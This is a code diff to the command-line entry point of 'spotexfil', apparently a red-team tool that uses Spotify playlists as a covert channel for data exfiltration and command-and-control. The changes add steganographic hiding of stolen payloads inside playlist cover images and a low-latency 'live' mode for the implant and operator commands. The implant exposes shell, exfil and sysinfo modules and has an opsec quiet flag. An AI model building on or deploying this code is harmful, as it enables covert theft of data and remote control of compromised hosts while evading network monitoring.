@@ -1,18 +1,24 @@
+//go:build !implantonly
+
 // Package main provides the spotexfil CLI.
 package main
 
 import (
 	"context"
+	"errors"
 	"fmt"
+	"html"
 	"io"
 	"os"
 	"strings"
+	"time"
 
 	"github.com/sourcefrenchy/spotexfil/internal/c2"
 	"github.com/sourcefrenchy/spotexfil/internal/crypto"
 	"github.com/sourcefrenchy/spotexfil/internal/encoding"
 	"github.com/sourcefrenchy/spotexfil/internal/shared"
 	"github.com/sourcefrenchy/spotexfil/internal/spotify"
+	"github.com/sourcefrenchy/spotexfil/internal/stego"
 	"github.com/spf13/cobra"
 )
 
@@ -46,7 +52,7 @@ func main() {
 
 func sendCmd() *cobra.Command {
 	var file, key string
-	var noCompress, legacyNames bool
+	var noCompress, legacyNames, cover bool
 
 	cmd := &cobra.Command{
 		Use:   "send",
@@ -75,6 +81,10 @@ func sendCmd() *cobra.Command {
 				return err
 			}
 
+			if cover {
+				return sendViaCover(ctx, client, payload)
+			}
+
 			// Write chunks
 			return client.WriteChunks(ctx, payload)
 		},
@@ -84,13 +94,46 @@ func sendCmd() *cobra.Command {
 	cmd.Flags().StringVarP(&key, "key", "k", "", "Encryption passphrase for AES-256-GCM")
 	cmd.Flags().BoolVar(&noCompress, "no-compress", false, "Disable gzip compression")
 	cmd.Flags().BoolVar(&legacyNames, "legacy-names", false, "Use N-payloadChunk naming")
+	cmd.Flags().BoolVar(&cover, "cover", false, "Hide the payload in a playlist cover image (one playlist, ~200KB max)")
 	cmd.MarkFlagRequired("file")
 
 	return cmd
 }
 
+// sendViaCover embeds the encoded payload in a generated playlist cover
+// image and uploads it as a single playlist's cover.
+func sendViaCover(ctx context.Context, client *spotify.Client, payload string) error {
+	jpeg, err := stego.GenerateCover(time.Now().UnixNano())
+	if err != nil {
+		return fmt.Errorf("generate cover: %w", err)
+	}
+	stegoJPEG, err := stego.Embed(jpeg, []byte(payload))
+	if err != nil {
+		if errors.Is(err, stego.ErrTooLarge) {
+			return fmt.Errorf("payload too large for cover channel: %d bytes encoded "+
+				"(cover capacity is ~%d KB — use the classic description channel)",
+				len(payload), (stego.MaxCoverSize-len(jpeg)-16)/1024)
+		}
+		return fmt.Errorf("embed: %w", err)
+	}
+
+	markerSep := shared.Proto.Transport.MarkerSep
+	id, err := client.CreateSessionPlaylist(ctx, spotify.GenerateCoverName(),
+		markerSep+`{"cover":1}`)
+	if err != nil {
+		return fmt.Errorf("create playlist: %w", err)
+	}
+	if err := client.SetPlaylistCover(ctx, id, stegoJPEG); err != nil {
+		return fmt.Errorf("set cover: %w", err)
+	}
+	fmt.Printf("[*] Data sent in one playlist cover (%d bytes payload, %d bytes image)\n",
+		len(payload), len(stegoJPEG))
+	return nil
+}
+
 func receiveCmd() *cobra.Command {
 	var key, output string
+	var cover bool
 
 	cmd := &cobra.Command{
 		Use:   "receive",
@@ -108,8 +151,12 @@ func receiveCmd() *cobra.Command {
 
 			ctx := context.Background()
 
-			// Retrieve chunks
-			payload, err := client.ReadChunks(ctx)
+			var payload string
+			if cover {
+				payload, err = receiveViaCover(ctx, client)
+			} else {
+				payload, err = client.ReadChunks(ctx)
+			}
 			if err != nil {
 				return err
 			}
@@ -136,8 +183,43 @@ func receiveCmd() *cobra.Command {
 
 	cmd.Flags().StringVarP(&key, "key", "k", "", "Decryption passphrase")
 	cmd.Flags().StringVarP(&output, "output", "o", "", "Output file path")
+	cmd.Flags().BoolVar(&cover, "cover", false, "Retrieve the payload from a playlist cover image")
 
 	return cmd
+}
+
+// receiveViaCover finds the playlist carrying a stego cover, downloads
+// the image, and extracts the payload. A clean ErrNoPayload means
+// Spotify re-encoded the image and the cover channel is unavailable.
+func receiveViaCover(ctx context.Context, client *spotify.Client) (string, error) {
+	markerSep := shared.Proto.Transport.MarkerSep
+	playlists, err := client.GetAllPlaylists(ctx)
+	if err != nil {
+		return "", err
+	}
+
+	for _, p := range playlists {
+		desc := html.UnescapeString(p.Description)
+		if !strings.Contains(desc, markerSep) || !strings.Contains(desc, "cover") {
+			continue
+		}
+		img, err := client.GetPlaylistCover(ctx, string(p.ID))
+		if err != nil {
+			return "", fmt.Errorf("download cover: %w", err)
+		}
+		payload, err := stego.Extract(img)
+		if err != nil {
+			if errors.Is(err, stego.ErrNoPayload) {
+				return "", fmt.Errorf("cover channel unavailable: Spotify re-encoded "+
+					"the image and stripped the payload (playlist %q). "+
+					"Use the classic description channel", p.Name)
+			}
+			return "", fmt.Errorf("extract: %w", err)
+		}
+		fmt.Printf("[*] Extracted %d bytes from cover of %q\n", len(payload), p.Name)
+		return string(payload), nil
+	}
+	return "", fmt.Errorf("no cover payload playlist found (send with --cover first)")
 }
 
 func cleanCmd() *cobra.Command {
@@ -163,7 +245,7 @@ func cleanCmd() *cobra.Command {
 func c2ImplantCmd() *cobra.Command {
 	var interval, jitter int
 	var pluginDir, tokenFile, modules, keyFile string
-	var quiet bool
+	var quiet, live bool
 
 	cmd := &cobra.Command{
 		Use:   "c2-implant",
@@ -217,6 +299,7 @@ func c2ImplantCmd() *cobra.Command {
 				Jitter:         jitter,
 				Quiet:          quiet,
 				AllowedModules: allowed,
+				Live:           live,
 			})
 			implant.Run()
 			return nil
@@ -230,6 +313,7 @@ func c2ImplantCmd() *cobra.Command {
 	cmd.Flags().BoolVarP(&quiet, "quiet", "q", false, "Suppress non-error output (opsec)")
 	cmd.Flags().StringVar(&keyFile, "key-file", "", "Write the generated session key to this path (0600) instead of stdout — required with --quiet")
 	cmd.Flags().StringVar(&modules, "modules", "", "Comma-separated module allowlist (e.g. shell,exfil,sysinfo,push) — empty = all")
+	cmd.Flags().BoolVar(&live, "live", false, "Live-session mode: edit-in-place session playlists (fewer API calls, lower latency)")
 
 	return cmd
 }
@@ -239,6 +323,7 @@ func c2OperatorCmd() *cobra.Command {
 	var pollInterval int
 	var persistSession bool
 	var tokenFile string
+	var live bool
 
 	cmd := &cobra.Command{
 		Use:   "c2-operator",
@@ -282,6 +367,7 @@ func c2OperatorCmd() *cobra.Command {
 			}
 
 			operator := c2.NewOperator(client, key, pollInterval, persistSession)
+			operator.SetLive(live)
 			operator.Interactive()
 			return nil
 		},
@@ -292,6 +378,7 @@ func c2OperatorCmd() *cobra.Command {
 	cmd.Flags().IntVar(&pollInterval, "poll-interval", 30, "Background poll interval in seconds (default 30)")
 	cmd.Flags().BoolVar(&persistSession, "persist-session", false,
 		"Persist session keys (encrypted) across restarts for result recovery (weakens forward secrecy)")
+	cmd.Flags().BoolVar(&live, "live", false, "Live-session mode: edit-in-place session playlists (fewer API calls, lower latency)")
 	cmd.Flags().StringVar(&tokenFile, "token-file", "", "Path to pre-staged Spotify token JSON (or use SPOTIFY_TOKEN_JSON)")
 
 	return cmd
